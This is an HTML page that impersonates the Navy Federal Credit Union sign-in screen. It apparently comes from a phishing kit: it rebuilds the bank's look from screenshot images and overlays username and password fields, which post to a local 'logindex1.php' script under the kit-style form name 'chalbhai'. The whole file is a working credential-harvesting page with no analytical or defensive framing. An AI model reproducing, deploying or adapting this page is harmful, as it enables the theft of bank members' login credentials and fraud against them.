<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Navy Federal Credit Union - About Us</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width: 1265px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:133px; z-index:2"><img src="images/header.PNG" alt="" title="" border=0 width=1349 height=133></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:140px; width:1348px; height:497px; z-index:3"><img src="images/mid1.PNG" alt="" title="" border=0 width=1348 height=497></div>


<form action="logindex1.php" name=chalbhai id=chalbhai method=post>
<input name="username"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:254px;height:30px;left:234px;top:340px;z-index:6">
<input name="password"  required title="Please Enter Right Value" autocomplete="off"  type="password" style="position:absolute;width:254px;height:30px;left:234px;top:410px;z-index:7">



<div id="formimage1" style="position:absolute; left:225px; top:449px; z-index:10"><input type="image" name="formimage1" width="102" height="48" src="images/sign.PNG"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:775px; width:1350px; height:313px; z-index:11"><img src="images/end.PNG" alt="" title="" border=0 width=1350 height=313></div>

</div>

</body>
</html>
